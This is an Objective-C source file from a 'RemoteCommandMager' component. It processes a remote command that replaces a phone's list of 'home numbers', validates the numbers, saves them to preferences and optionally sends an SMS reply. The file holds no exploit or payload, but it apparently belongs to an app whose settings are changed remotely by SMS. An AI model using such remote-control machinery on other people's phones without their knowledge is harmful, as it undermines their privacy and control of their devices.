/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetHomesProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetHomesProcessor.h"
#import "PrefHomeNumber.h"
#import "Preference.h"

@interface ResetHomesProcessor (PrivateAPI)
- (void) processResetHomesNumber;
- (void) resetHomeNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetHomeNumber;
@end

@implementation ResetHomesProcessor

@synthesize mHomesList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetHomesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetHomesProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetHomesProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetHomesProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetHomesProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		
		mHomesList = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] 
																		   validationType:kPhoneNumberValidation]];
		DLog(@"ResetHomesProcessor--->Home Numbers:%@",mHomesList);
		if ([mHomesList count] > 0) {
			if ([self canResetHomeNumber]) { 
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mHomesList]) [self processResetHomesNumber];
				else [self resetHomeNumberException:kCmdExceptionErrorCannotAddDuplicateToHomeList];
			}
			else {
				[self resetHomeNumberException:kCmdExceptionErrorHomeNumberExceedListCapacity];
			}
		}
		else {
			[self resetHomeNumberException:kCmdExceptionErrorInvalidHomeNumberToHomeList];
		}
	} else {
		[self resetHomeNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark ResetHomesProcessor PrivateAPI Methods

/**
 - Method name: processResetHomesNumber
 - Purpose:This method is used to process reset Home Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processResetHomesNumber {
	DLog (@"ResetHomesProcessor--->processResetHomesNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	[prefHomeNumberList setMHomeNumbers:mHomesList];
	[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
    [self sendReplySMS];
}

/**
 - Method name: canResetHomeNumber
 - Purpose:This method is to check maximum home number list capacity. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canResetHomeNumber {
	DLog (@"ResetHomesProcessor--->canResetHomeNumber");
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
//	DLog(@"count in preference %d", [[prefHomeNumberList mHomeNumbers] count])
//	DLog(@"new number in preference %d", [mHomesList count])
	int count = [mHomesList count];
	if (count <= HOME_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: resetHomeNumberException
 - Purpose:This method is invoked when home number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetHomeNumberException: (NSUInteger) aErrorCode {
	DLog (@"ResetHomesProcessor--->resetHomeNumberException")
	FxException* exception = [FxException exceptionWithName:@"resetHomeNumberException" andReason:@"Add Home number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetHomesProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mHomesList release];
	[super dealloc];
}
@end
